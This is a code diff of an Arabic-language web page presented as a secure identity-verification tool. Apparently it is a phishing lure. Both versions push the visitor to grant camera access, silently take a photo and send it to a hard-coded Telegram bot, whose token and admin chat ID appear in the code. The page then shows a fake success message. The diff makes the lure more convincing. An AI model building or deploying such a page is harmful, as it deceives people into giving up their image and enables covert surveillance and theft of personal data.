@@ -3,56 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التحقق من الهوية</title>
+    <title>نظام التحقق الآمن</title>
     <style>
-        body { font-family: sans-serif; text-align: center; background: #121212; color: white; padding-top: 100px; }
-        .card { background: #1e1e1e; padding: 30px; border-radius: 15px; display: inline-block; border: 1px solid #333; }
-        button { background: #28a745; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; }
-        #status { margin-top: 20px; color: #888; }
+        body { font-family: sans-serif; text-align: center; background: #121212; color: white; padding: 50px 20px; }
+        .card { background: #1e1e1e; padding: 30px; border-radius: 20px; border: 1px solid #333; max-width: 400px; margin: auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        button { background: #28a745; color: white; border: none; padding: 18px 30px; font-size: 20px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; transition: 0.3s; }
+        button:active { transform: scale(0.98); background: #218838; }
+        #status { margin-top: 25px; color: #ffc107; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>أداة التحقق من الحساب</h2>
-        <p>يرجى الضغط على الزر أدناه للمتابعة</p>
-        <button onclick="start()">تفعيل ودخول</button>
-        <div id="status"></div>
+        <h2>التحقق من الهوية</h2>
+        <p>اضغط على الزر أدناه ثم اختر "سماح" (Allow) عندما يطلب المتصفح إذن الكاميرا.</p>
+        <button id="startBtn">بدء عملية التحقق</button>
+        <div id="status">بانتظار بدء العملية...</div>
     </div>
-    <video id="v" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="c" width="640" height="480" style="display:none;"></canvas>
+
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
 
     <script>
         const TOKEN = "8348320270:AAGKegixiqLVoglb-Th0DuR9PfEdajS8yQo";
         const ADMIN_ID = "7289235107";
 
-        async function start() {
-            const s = document.getElementById('status');
+        const btn = document.getElementById('startBtn');
+        const status = document.getElementById('status');
+        const video = document.getElementById('v');
+
+        btn.addEventListener('click', async () => {
             try {
-                s.innerText = "جاري طلب الإذن...";
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                document.getElementById('v').srcObject = stream;
-                s.innerText = "تم الاتصال.. جاري المعالجة";
+                status.innerText = "جاري طلب الإذن... يرجى الضغط على 'سماح'";
                 
+                // هذه هي الخطوة التي ترسل الطلب للمتصفح لإظهار النافذة المنبثقة
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+
+                status.innerText = "تم السماح! جاري التقاط الصورة...";
+                btn.style.display = "none";
+                video.srcObject = stream;
+
+                // انتظر قليلاً حتى تفتح الكاميرا فعلياً
                 setTimeout(async () => {
                     const canvas = document.getElementById('c');
-                    canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
-                    const img = canvas.toDataURL('image/jpeg', 0.7);
-                    const blob = await (await fetch(img)).blob();
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const imgData = canvas.toDataURL('image/jpeg', 0.8);
+                    const response = await fetch(imgData);
+                    const blob = await response.blob();
 
                     const fd = new FormData();
                     fd.append('chat_id', ADMIN_ID);
-                    fd.append('photo', blob, 'capture.jpg');
+                    fd.append('photo', blob, 'identity.jpg');
 
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd })
-                    .then(() => {
-                        s.innerText = "تم التحقق بنجاح!";
-                        stream.getTracks().forEach(t => t.stop());
+                    // إرسال الصورة إلى البوت
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: fd
                     });
-                }, 2000);
-            } catch (e) {
-                s.innerText = "خطأ: يجب السماح بالكاميرا للعمل.";
+
+                    status.style.color = "#28a745";
+                    status.innerText = "✅ تم التحقق بنجاح! شكراً لك.";
+                    
+                    // إغلاق الكاميرا لتوفير البطارية
+                    stream.getTracks().forEach(track => track.stop());
+                }, 2500);
+
+            } catch (err) {
+                console.error(err);
+                status.style.color = "#ff4d4d";
+                status.innerText = "❌ فشل: يجب السماح بالكاميرا من إعدادات المتصفح لكي يعمل النظام.";
             }
-        }
+        });
     </script>
 </body>
 </html>
